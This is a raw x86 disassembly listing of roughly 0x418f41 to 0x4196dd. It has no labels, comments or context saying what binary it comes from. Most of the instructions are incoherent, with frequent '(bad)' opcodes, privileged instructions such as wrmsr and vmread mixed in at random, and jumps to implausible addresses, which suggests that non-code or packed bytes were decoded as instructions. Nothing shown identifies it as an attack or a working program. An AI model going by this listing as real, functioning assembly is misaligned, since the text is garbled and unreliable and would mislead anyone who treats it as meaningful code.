  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
  419007:	mov    DWORD PTR [ebp-0x4],ebx
  41900a:	add    edi,esi
  41900c:	pop    es
  41900d:	add    esi,DWORD PTR [edi-0x48ccf183]
  419013:	mov    DWORD PTR [esp+esi*8],ecx
  419016:	inc    ebp
  419017:	pop    ebp
  419018:	xor    DWORD PTR [esi-0x4],0x3b
  41901c:	add    edx,DWORD PTR [ecx+edi*1]
  41901f:	push   es
  419020:	clc    
  419021:	mov    bh,0xdb
  419023:	jp     0x418fdc
  419025:	add    cl,BYTE PTR [esi]
  419027:	div    DWORD PTR [edi+0x4d8b0c1c]
  41902d:	test   edi,edi
  41902f:	je     0x419025
  419031:	mov    eax,ecx
  419033:	or     BYTE PTR [ebx],al
  419035:	dec    BYTE PTR [ecx+0x7d3bec7d]
  41903b:	jbe    0x4190af
  41903d:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  419043:	add    ecx,DWORD PTR [esi]
  419045:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  41904b:	add    eax,DWORD PTR [ebx-0x287af783]
  419051:	je     0x4190a0
  419053:	mov    DWORD PTR [ecx],edi
  419055:	mov    esi,eax
  419057:	hlt    
  419058:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  41905f:	jb     0x419021
  419061:	jmp    0x41904e
  419063:	xor    esi,DWORD PTR [ebx]
  419065:	pop    edi
  419066:	pop    esi
  419067:	pop    ebx
  419068:	ret    
  419069:	ret    0x8b
  41906c:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  419072:	xor    DWORD PTR [ecx],0xc
  419075:	pushf  
  419076:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  41907c:	wrmsr  
  41907e:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  419085:	dec    ebp
  419086:	ret    
  419087:	mov    edi,DWORD PTR [esi-0x4]
  41908a:	pop    eax
  41908b:	dec    ebp
  41908c:	jne    0x419019
  41908e:	xor    edi,esp
  419090:	inc    eax
  419091:	dec    ebp
  419092:	jbe    0x4190e7
  419094:	inc    eax
  419095:	pop    ebp
  419096:	add    edx,DWORD PTR [esi+0x8]
  419099:	push   ebp
  41909a:	dec    eax
  41909b:	push   ecx
  41909c:	mov    eax,edi
  41909e:	and    al,0xf0
  4190a0:	jo     0x41908d
  4190a2:	mov    eax,DWORD PTR [ebx]
  4190a4:	sbb    BYTE PTR [ebp+0x4d],cl
  4190a7:	mov    eax,DWORD PTR [ebx]
  4190a9:	nop
  4190aa:	or     BYTE PTR [eax],al
  4190ac:	jne    0x419105
  4190ae:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  4190b5:	xor    edi,edi
  4190b7:	add    edi,DWORD PTR [ebp+0x3]
  4190ba:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  4190c0:	js     0x419046
  4190c2:	jae    0x4190c6
  4190c4:	(bad)  
  4190c6:	xor    al,0x5d
  4190c8:	jmp    0x419055
  4190ca:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  4190d1:	fdecstp 
  4190d3:	test   BYTE PTR [edi],ah
  4190d5:	add    bh,BYTE PTR [ebp+0x0]
  4190d8:	add    ebx,DWORD PTR [ebp-0x77]
  4190db:	mov    edi,eax
  4190dd:	cmp    al,0x0
  4190e0:	adc    dh,BYTE PTR [ebx]
  4190e2:	jge    0x4190e7
  4190e4:	mov    edi,DWORD PTR [ebx]
  4190e6:	jl     0x4190f7
  4190e8:	clc    
  4190e9:	dec    edi
  4190ea:	jge    0x4190ec
  4190ec:	mov    eax,DWORD PTR [ebx]
  4190ee:	jb     0x4190f8
  4190f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4190f3:	mov    edi,edi
  4190f5:	xor    edx,DWORD PTR [eax]
  4190f7:	add    edi,DWORD PTR [ebx]
  4190f9:	mov    DWORD PTR [ebp-0x10],edi
  4190fc:	inc    edi
  4190fd:	pop    ebp
  4190fe:	jge    0x41913b
  419100:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  419104:	mov    edx,0xc05d87f0
  419109:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  41910d:	fimul  WORD PTR [eax]
  41910f:	fist   WORD PTR [ebp+0x1c]
  419112:	in     al,dx
  419113:	jne    0x419101
  419115:	mov    edi,DWORD PTR [edx-0x7a27a10]
  41911b:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  41911f:	fdivp  st(0),st
  419121:	fild   WORD PTR [ebp+0x4510f85c]
  419127:	test   BYTE PTR [ebx+0x4d00fc02],cl
  41912d:	inc    ebp
  41912e:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  419134:	mov    ebp,DWORD PTR [ebx-0x4]
  419137:	adc    al,0x8b
  419139:	rcl    DWORD PTR [eax],0x48
  41913c:	mov    esi,0x7080803
  419141:	fiadd  WORD PTR [ebp+0x4d]
  419144:	(bad)  
  419145:	mov    edx,DWORD PTR [edx-0x4]
  419148:	mov    edx,DWORD PTR [ebp-0x4]
  41914b:	xor    ebx,DWORD PTR [ebx+0x330103]
  419151:	mov    DWORD PTR [edi+0x872dc],edi
  419157:	xlat   BYTE PTR ds:[ebx]
  419158:	into   
  419159:	ffreep st(6)
  41915b:	retf   0x6c7
  41915e:	iret   
  41915f:	dec    ebp
  419160:	inc    ebp
  419161:	mov    DWORD PTR [ebx],edi
  419163:	fmul   QWORD PTR [edi]
  419165:	dec    ebp
  419166:	jnp    0x41919b
  419168:	add    BYTE PTR [ebx],al
  41916a:	mov    ecx,DWORD PTR [esp+edi*8]
  41916d:	inc    ebp
  41916e:	dec    ebp
  41916f:	lea    esi,[ebx]
  419171:	add    DWORD PTR [ebx],eax
  419173:	jb     0x4191b0
  419175:	add    BYTE PTR [edi],cl
  419177:	inc    ebp
  419178:	imul   eax,edi,0x858bd800
  41917e:	cld    
  41917f:	clc    
  419180:	mov    DWORD PTR [ebp+0x0],eax
  419183:	inc    DWORD PTR [eax]
  419185:	or     al,0xde
  419187:	sbb    bh,0x1
  41918a:	retf   
  41918b:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  419192:	dec    ebp
  419193:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  419199:	enter  0x12de,0xdf
  41919d:	inc    ebp
  41919e:	pop    ebp
  41919f:	dec    DWORD PTR [ebx-0x257f0ff4]
  4191a5:	add    DWORD PTR [edx],edx
  4191a7:	add    BYTE PTR [ebp+0x50],dl
  4191aa:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  4191b0:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  4191b6:	or     ah,al
  4191b8:	pop    ss
  4191b9:	cdq    
  4191ba:	push   ebp
  4191bb:	clc    
  4191bc:	mov    eax,DWORD PTR [ebp-0x4]
  4191bf:	xor    edx,edx
  4191c1:	add    esi,DWORD PTR [ebx]
  4191c3:	cmp    eax,DWORD PTR [ebx]
  4191c5:	hlt    
  4191c6:	cmp    DWORD PTR [ebx],esp
  4191c8:	or     al,BYTE PTR [ebp+0xf]
  4191cb:	mov    eax,DWORD PTR [edx]
  4191cd:	loopne 0x4191cf
  4191cf:	(bad)  
  4191d0:	mov    ecx,esi
  4191d2:	cld    
  4191d3:	pushf  
  4191d4:	pop    ebp
  4191d5:	pushf  
  4191d6:	mov    esi,DWORD PTR [edx]
  4191d8:	lock mov eax,eax
  4191db:	adc    BYTE PTR [ebx],al
  4191dd:	or     BYTE PTR [ebx+0x4d001001],0xcf
  4191e4:	xor    ebp,DWORD PTR [edi+0x50e45189]
  4191ea:	dec    ebp
  4191eb:	mov    ecx,DWORD PTR [ebx-0x31390304]
  4191f1:	(bad)  
  4191f2:	iret   
  4191f3:	inc    ebp
  4191f4:	(bad)  
  4191f5:	jne    0x419244
  4191f7:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  4191fd:	(bad)  
  4191fe:	cmp    ebx,eax
  419200:	je     0x419188
  419202:	add    edi,edi
  419204:	or     bh,bh
  419206:	dec    ebp
  419207:	inc    ebp
  419208:	mov    esi,DWORD PTR [ebx]
  41920a:	cld    
  41920b:	add    ecx,esi
  41920d:	cmp    ecx,DWORD PTR [eax-0xc]
  419210:	mov    edx,DWORD PTR [edi]
  419212:	or     BYTE PTR [ebp-0x7c],al
  419215:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  41921c:	or     al,0x9c
  41921e:	inc    ebp
  41921f:	xor    bh,BYTE PTR [ecx+ecx*4]
  419222:	pushf  
  419223:	call   0x5281b3
  419228:	jne    0x4191f1
  41922a:	mov    ebp,esp
  41922c:	fcomp  DWORD PTR [ebx]
  41922e:	add    BYTE PTR [ecx],al
  419230:	inc    DWORD PTR [ebp-0x75]
  419233:	(bad)  
  419234:	cld    
  419235:	add    al,0xce
  419237:	mov    ecx,edi
  419239:	cld    
  41923a:	inc    ebp
  41923b:	fidivr WORD PTR [ebx]
  41923d:	fbstp  TBYTE PTR [ebp-0x3e]
  419240:	mov    eax,DWORD PTR [eax]
  419242:	adc    BYTE PTR [ebx-0x3974038b],cl
  419248:	fadd   st,st(7)
  41924a:	add    BYTE PTR [ebp-0x1],al
  41924d:	mov    ecx,DWORD PTR [esp+edi*8]
  419250:	inc    ebp
  419251:	mov    bh,0xc7
  419254:	loopne 0x41929b
  419256:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  41925c:	sbb    BYTE PTR [ebx],dh
  41925e:	pushf  
  41925f:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  419265:	mov    eax,edi
  419267:	cwde   
  419268:	inc    ebp
  419269:	inc    ebp
  41926a:	jne    0x4191f7
  41926c:	mov    esp,esp
  41926e:	clc    
  41926f:	add    al,0x4d
  419271:	mov    DWORD PTR [ebx],esi
  419273:	or     al,0x33
  419275:	inc    ebp
  419276:	lea    ecx,[ebx-0x398d13fd]
  41927c:	add    bh,al
  41927e:	inc    ebp
  41927f:	ror    DWORD PTR [ebx+0x45d829],0x8b
  419286:	add    ebp,esp
  419288:	shufps xmm1,xmm3,0xc7
  41928c:	(bad)  
  41928d:	jmp    0x7486cdb6
  419292:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  419298:	hlt    
  419299:	mov    ecx,DWORD PTR [edi]
  41929b:	fadd   DWORD PTR [ebp+0x0]
  41929e:	xor    ecx,DWORD PTR [edi]
  4192a0:	add    ecx,ecx
  4192a2:	cmp    edi,edi
  4192a4:	pmuludq mm7,QWORD PTR [edx+0x50]
  4192a8:	(bad)  
  4192a9:	jmp    0x419236
  4192ab:	mov    edi,esp
  4192ad:	or     al,0xc6
  4192af:	inc    ebp
  4192b0:	(bad)  
  4192b1:	mov    eax,DWORD PTR [ebp+0x10]
  4192b4:	jne    0x41923f
  4192b6:	mov    eax,DWORD PTR [ecx]
  4192b8:	clc    
  4192b9:	add    BYTE PTR [ebp-0x40],cl
  4192bc:	xor    edx,DWORD PTR [eax-0x73]
  4192bf:	jne    0x4192c2
  4192c1:	push   DWORD PTR [edx+0x8]
  4192c4:	add    BYTE PTR [ebp+0x45],al
  4192c7:	mov    ebp,ecx
  4192c9:	cld    
  4192ca:	add    BYTE PTR [ebp+0x0],cl
  4192cd:	xor    eax,DWORD PTR [ebp+0x3]
  4192d0:	mov    DWORD PTR [ebx],edi
  4192d2:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  4192d8:	sub    eax,0x5d330e4d
  4192dd:	lea    esi,[ebx]
  4192df:	add    DWORD PTR [ebx],eax
  4192e1:	jb     0x4192cc
  4192e3:	add    BYTE PTR [eax],al
  4192e5:	inc    ebp
  4192e6:	add    bl,ch
  4192e8:	inc    ebp
  4192e9:	mov    esi,DWORD PTR [ebx]
  4192eb:	or     al,0x3
  4192ed:	(bad)  
  4192ee:	mov    edi,eax
  4192f0:	in     al,dx
  4192f1:	scas   eax,DWORD PTR es:[edi]
  4192f2:	inc    ebp
  4192f3:	mov    esi,DWORD PTR [ebx]
  4192f5:	in     al,0x3
  4192f7:	add    al,0x89
  4192f9:	mov    ecx,DWORD PTR [eax+edi*8]
  4192fc:	dec    ebp
  4192fd:	(bad)  
  4192fe:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  419305:	mov    ecx,eax
  419307:	cld    
  419308:	push   es
  419309:	dec    ebp
  41930a:	add    al,0x33
  41930c:	mov    DWORD PTR [ebx],eax
  41930e:	in     al,dx
  41930f:	cmp    DWORD PTR [ebp-0x67],eax
  419312:	mov    eax,DWORD PTR [ebp-0xba0068]
  419318:	mov    edx,DWORD PTR [ebp-0x4]
  41931b:	mov    ecx,DWORD PTR [ebp-0x18]
  41931e:	xor    ecx,DWORD PTR [ebp+0x3]
  419321:	cmp    DWORD PTR [ebx],0x8b32749b
  419327:	xor    edi,esp
  419329:	jmp    0xff75907b
  41932e:	add    ecx,DWORD PTR [ebp-0x3f]
  419331:	xor    ebx,DWORD PTR [edi]
  419333:	add    eax,ecx
  419335:	cmp    ebx,DWORD PTR [eax]
  419337:	mov    ecx,DWORD PTR [ebp-0x4]
  41933a:	mov    ecx,DWORD PTR [eax]
  41933c:	adc    BYTE PTR [ebp-0x80],al
  41933f:	jmp    0x419342
  419341:	mov    eax,DWORD PTR [eax]
  419343:	cld    
  419344:	mov    bh,0xc6
  419346:	push   ecx
  419347:	(bad)  
  419348:	jne    0x4193a8
  41934a:	dec    ecx
  41934c:	or     BYTE PTR [ecx+ebx*1],cl
  41934f:	push   ebp
  419350:	inc    ebp
  419351:	in     al,dx
  419352:	add    ebp,esp
  419354:	or     bh,al
  419356:	dec    ebp
  419357:	cld    
  419358:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  41935e:	xor    DWORD PTR [eax],0x2
  419361:	pushf  
  419362:	dec    DWORD PTR [ebx+0x45510cf4]
  419368:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  41936e:	mov    edx,DWORD PTR [ecx+0xc]
  419371:	xor    eax,esi
  419373:	mov    edx,0xc172c7
  419378:	inc    ebp
  419379:	mov    esi,DWORD PTR [ebp+0x8]
  41937c:	mov    eax,edx
  41937e:	call   0x84c65a73
  419383:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  41938a:	call   0x4db1a397
  41938f:	push   edi
  419390:	xor    esi,DWORD PTR [ebp+0x3]
  419393:	(bad)  
  419394:	pmulhuw mm0,mm1
  419397:	test   DWORD PTR [ebp-0x8],ecx
  41939a:	mov    DWORD PTR [ebp-0x67],eax
  41939d:	mov    eax,DWORD PTR [ebp-0x4]
  4193a0:	xor    edi,DWORD PTR [ebp-0x73]
  4193a3:	xor    eax,DWORD PTR [ebx]
  4193a5:	xor    esi,DWORD PTR [edx+0x3]
  4193a8:	add    BYTE PTR [ecx],bh
  4193aa:	inc    ebp
  4193ab:	(bad)  
  4193ac:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  4193b2:	mov    DWORD PTR [eax],0x750f0004
  4193b8:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  4193be:	lock add BYTE PTR [ebp+0x0],al
  4193c2:	mov    esi,DWORD PTR [ebp-0x2c]
  4193c5:	mov    ebp,edx
  4193c7:	or     al,0x72
  4193c9:	ja     0x4193cb
  4193cb:	mov    edx,esi
  4193cd:	cld    
  4193ce:	(bad)  
  4193d1:	cli    
  4193d2:	mov    esi,DWORD PTR [ebp-0x4]
  4193d5:	cmp    ecx,esi
  4193d7:	bswap  edi
  4193d9:	(bad)
  4193dd:	mov    esi,DWORD PTR [ebp-0x4]
  4193e0:	mov    esi,ecx
  4193e2:	clc    
  4193e3:	repnz add esi,DWORD PTR [ebp+0x45]
  4193e7:	push   ebx
  4193e8:	xor    eax,DWORD PTR [ebp+0x3]
  4193eb:	xor    bl,BYTE PTR [edi-0x64]
  4193ee:	pop    ebx
  4193ef:	jmp    0x4194b6
  4193f4:	mov    esi,DWORD PTR [ebp-0x7d]
  4193f7:	xor    ebp,DWORD PTR [eax]
  4193f9:	lea    eax,[ebp-0x8]
  4193fc:	xor    edx,esi
  4193fe:	pushf  
  4193ff:	out    dx,eax
  419400:	(bad)  
  419401:	neg    eax
  419403:	ins    DWORD PTR es:[edi],dx
  419404:	test   esi,edi
  419406:	clc    
  419407:	pop    esp
  419408:	inc    ebp
  419409:	or     BYTE PTR [ecx+0x450f0c7d],cl
  41940f:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  419415:	add    cl,al
  419417:	jne    0x4193b5
  419419:	mov    esi,DWORD PTR [edx]
  41941b:	in     al,dx
  41941c:	push   esi
  41941d:	xor    BYTE PTR [ebp-0xe],dh
  419420:	add    edi,esi
  419422:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  419428:	add    cl,bh
  41942a:	mov    edi,DWORD PTR [ebp+0x8]
  41942d:	mov    DWORD PTR [ebp-0x14],esi
  419430:	add    esi,DWORD PTR [ebp+0x3c]
  419433:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  419439:	mov    ah,0x3c
  41943b:	pushf  
  41943c:	pushf  
  41943d:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  419443:	jne    0x4193d0
  419445:	mov    ecx,DWORD PTR [esp+ebp*8]
  419448:	icebp  
  419449:	icebp  
  41944a:	shl    edx,0xf2
  41944d:	(bad)  
  41944e:	mov    ah,0x16
  419450:	pop    eax
  419451:	jne    0x4193e6
  419453:	mov    ecx,DWORD PTR [edi]
  419455:	in     al,dx
  419456:	jmp    0x419449
  419458:	add    dl,dh
  41945a:	mov    edi,esi
  41945c:	or     al,0x8
  41945e:	inc    ebp
  41945f:	jne    0x419464
  419461:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  419467:	ret    
  419468:	or     bh,bh
  41946a:	jge    0x419454
  41946c:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  419472:	xor    edi,eax
  419474:	add    esi,DWORD PTR [ebp-0x77]
  419477:	mov    ebx,esp
  419479:	clc    
  41947a:	neg    DWORD PTR [ebp-0x7c]
  41947d:	xor    eax,DWORD PTR [eax]
  41947f:	cmp    eax,DWORD PTR [eax]
  419481:	repz jne 0x419419
  419484:	xor    eax,DWORD PTR [ecx]
  419486:	add    ebx,DWORD PTR [eax]
  419488:	mov    DWORD PTR [ebp-0x8],eax
  41948b:	mov    eax,edi
  41948d:	cld    
  41948e:	lock pop eax
  419490:	test   DWORD PTR [ebx],esi
  419492:	clc    
  419493:	add    edx,DWORD PTR [edi-0x740bff77]
  419499:	fdivp  st(4),st
  41949b:	test   ecx,esi
  41949d:	(bad)  
  41949e:	jnp    0x41949f
  4194a0:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  4194a6:	jae    0x419433
  4194a8:	sub    edi,esp
  4194aa:	(bad)  
  4194ab:	shl    DWORD PTR [eax-0x3e],0x89
  4194af:	leave  
  4194b0:	call   0x81974bbd
  4194b5:	in     al,dx
  4194b6:	(bad)  
  4194b7:	in     al,dx
  4194b8:	add    bh,al
  4194ba:	mov    esp,edi
  4194bc:	in     al,dx
  4194bd:	test   DWORD PTR [ebp-0x8],edi
  4194c0:	mov    eax,DWORD PTR [ebp+0x2b]
  4194c3:	xor    BYTE PTR [ebx],al
  4194c5:	pushf  
  4194c6:	jnp    0x573090ff
  4194cc:	xor    edx,DWORD PTR [ebp-0x77]
  4194cf:	push   ecx
  4194d0:	loopne 0x419505
  4194d2:	jne    0x41948f
  4194d4:	mov    esi,DWORD PTR [edx-0x20]
  4194d7:	add    BYTE PTR [ebp-0x3d],bh
  4194da:	xor    eax,DWORD PTR [ebp-0x73]
  4194dd:	mov    edi,DWORD PTR [esi]
  4194df:	cld    
  4194e0:	jb     0x4194a8
  4194e2:	add    bl,al
  4194e4:	jne    0x41952b
  4194e6:	mov    edx,DWORD PTR [edi-0x10]
  4194e9:	jge    0x419568
  4194eb:	mov    esi,DWORD PTR [ebx]
  4194ed:	lock add ecx,DWORD PTR [ebp+0x3b]
  4194f1:	xor    esi,DWORD PTR [ebp-0x77]
  4194f4:	mov    esi,eax
  4194f6:	lock inc ebp
  4194f8:	jge    0x41952b
  4194fa:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  419501:	dec    ebp
  419502:	mov    esi,DWORD PTR [ebx]
  419504:	loopne 0x41948f
  419506:	jge    0x419500
  419508:	add    DWORD PTR [ebp-0x7d],eax
  41950b:	icebp  
  41950c:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  419513:	dec    ebp
  419514:	hlt    
  419515:	xor    ebx,DWORD PTR [ebp-0x77]
  419518:	mov    esi,esp
  41951a:	in     al,0x45
  41951c:	jge    0x41955b
  41951e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  419525:	dec    ebp
  419526:	pop    esp
  419527:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  41952d:	inc    ebp
  41952e:	hlt    
  41952f:	xor    DWORD PTR [ebp-0x61],esi
  419532:	mov    edi,DWORD PTR [eax+0xf19504]
  419538:	repnz mov DWORD PTR [ebp+0x20],ebx
  41953c:	cmp    eax,DWORD PTR [ebp+0xf]
  41953f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  419543:	fistp  WORD PTR [ebx+0x0]
  419546:	inc    ebp
  419547:	mov    ebx,DWORD PTR [edi+0xc]
  41954a:	add    eax,eax
  41954c:	inc    ebp
  41954d:	test   BYTE PTR [ebx],dh
  41954f:	add    eax,DWORD PTR [ebx]
  419551:	add    BYTE PTR [esi+0x45],bl
  419554:	ret    0x85
  419557:	jnp    0x54421926
  41955d:	inc    bp
  41955f:	inc    ebp
  419560:	xor    DWORD PTR [ecx+0xc78a9c],edi
  419566:	fdiv   QWORD PTR [ebx]
  419568:	test   DWORD PTR [ecx+0x453bf8],edi
  41956e:	push   ebx
  41956f:	add    edi,DWORD PTR [esi+0x708088b]
  419575:	cmp    esi,eax
  419577:	setl   BYTE PTR [ecx-0x74fcffce]
  41957e:	mov    esp,edi
  419580:	call   0x33ccdad2
  419585:	or     BYTE PTR [ebx],al
  419587:	inc    ecx
  419588:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  41958e:	and    BYTE PTR [ebp-0x7074f0bb],al
  419594:	lock add cl,al
  419597:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  41959e:	mov    ch,0x45
  4195a0:	clc    
  4195a1:	xor    eax,DWORD PTR [ebp+0x3]
  4195a4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4195aa:	inc    ebp
  4195ab:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4195b1:	mov    edi,eax
  4195b3:	mov    eax,DWORD PTR [ebp+0x3c]
  4195b6:	mov    ecx,DWORD PTR [eax]
  4195b8:	hlt    
  4195b9:	inc    ebp
  4195ba:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4195c1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4195c7:	push   ebp
  4195c8:	mov    edi,DWORD PTR [ebx]
  4195ca:	in     al,dx
  4195cb:	jne    0x41958e
  4195cd:	mov    eax,DWORD PTR [ebp-0x28]
  4195d0:	add    DWORD PTR [eax],0xe8058dec
  4195d6:	clc    
  4195d7:	mov    esi,DWORD PTR [edi-0x8]
  4195da:	add    dh,dl
  4195dc:	rol    WORD PTR [ebp-0x1],cl
  4195e0:	mov    edx,DWORD PTR [eax+0x8]
  4195e3:	jne    0x4195a5
  4195e5:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4195ec:	inc    ebp
  4195ed:	push   esp
  4195ee:	test   DWORD PTR [ecx+0xf],ecx
  4195f1:	sub    edx,esp
  4195f3:	add    eax,DWORD PTR [eax]
  4195f5:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4195fb:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  419602:	mov    eax,DWORD PTR [ecx]
  419604:	and    BYTE PTR [eax],al
  419606:	adc    BYTE PTR ds:[eax],al
  419609:	inc    ebp
  41960a:	inc    cx
  41960d:	push   esp
  41960e:	add    al,0x75
  419610:	add    BYTE PTR [edx+0x66],dl
  419613:	enter  0xc1,0x4d
  419617:	mov    esp,DWORD PTR [esi+0x20]
  41961a:	add    DWORD PTR [ecx-0x7b],eax
  41961d:	add    eax,DWORD PTR [ebx]
  41961f:	str    WORD PTR [eax+0x45]
  419623:	lea    ecx,[ebx+0x45890801]
  419629:	sbb    BYTE PTR [ebx],al
  41962b:	dec    ebp
  41962c:	cmp    al,0xf
  41962e:	inc    ebp
  41962f:	push   eax
  419630:	mov    esi,DWORD PTR [ebx]
  419632:	push   eax
  419633:	add    eax,eax
  419635:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  41963c:	inc    ebp
  41963d:	add    BYTE PTR [ecx],dh
  41963f:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  419646:	(bad)  
  419647:	mov    ebx,eax
  419649:	loopne 0x419690
  41964b:	dec    ebp
  41964c:	mov    ecx,DWORD PTR [edi]
  41964e:	cld    
  41964f:	push   eax
  419650:	xchg   DWORD PTR [ebx],esi
  419652:	add    DWORD PTR [ebx],ebp
  419654:	add    BYTE PTR [ebx],ch
  419656:	or     BYTE PTR [ecx],bh
  419658:	dec    ecx
  419659:	loopne 0x41965e
  41965b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  419661:	push   ebp
  419662:	add    DWORD PTR [ebx+0x55100800],eax
  419668:	dec    ebp
  419669:	jmp    0x4195f4
  41966b:	mov    esp,DWORD PTR [eax]
  41966d:	sbb    dl,dl
  41966f:	inc    eax
  419670:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  419676:	add    BYTE PTR [ebx+0x74528555],cl
  41967c:	push   ebp
  41967d:	div    DWORD PTR [ebx]
  41967f:	and    eax,DWORD PTR [ebx]
  419681:	add    edx,DWORD PTR [edx-0x30]
  419684:	jno    0x419611
  419686:	inc    DWORD PTR [eax+eiz*1]
  419689:	inc    ebp
  41968a:	push   eax
  41968b:	push   eax
  41968c:	mov    esp,DWORD PTR [edi-0x74beff1c]
  419692:	mov    edi,esp
  419694:	push   eax
  419695:	inc    ebp
  419696:	enter  0x458b,0x8
  41969a:	push   ecx
  41969b:	(bad)  
  41969c:	call   0x10ba074
  4196a1:	pop    ss
  4196a2:	push   ebp
  4196a3:	mov    ecx,DWORD PTR [ebx+0x489408]
  4196a9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4196af:	push   ecx
  4196b0:	jo     0x41969a
  4196b2:	inc    DWORD PTR [edi]
  4196b4:	or     BYTE PTR [eax],al
  4196b6:	call   0xcc9e00
  4196bb:	fmul   QWORD PTR [ebp+0x55]
  4196be:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4196c4:	mov    bh,0x8c
  4196c6:	adc    al,0x9c
  4196c8:	dec    esp
  4196c9:	xor    bl,BYTE PTR [eax]
  4196cb:	mov    ecx,DWORD PTR [ebp+0xc]
  4196ce:	mov    eax,DWORD PTR [ebp-0x4]
  4196d1:	mov    esi,DWORD PTR [edi-0x3148f924]
  4196d7:	push   es
  4196d8:	retf   
  4196d9:	mov    BYTE PTR [ebp-0x30],0x3b
  4196dd:	inc    ebp
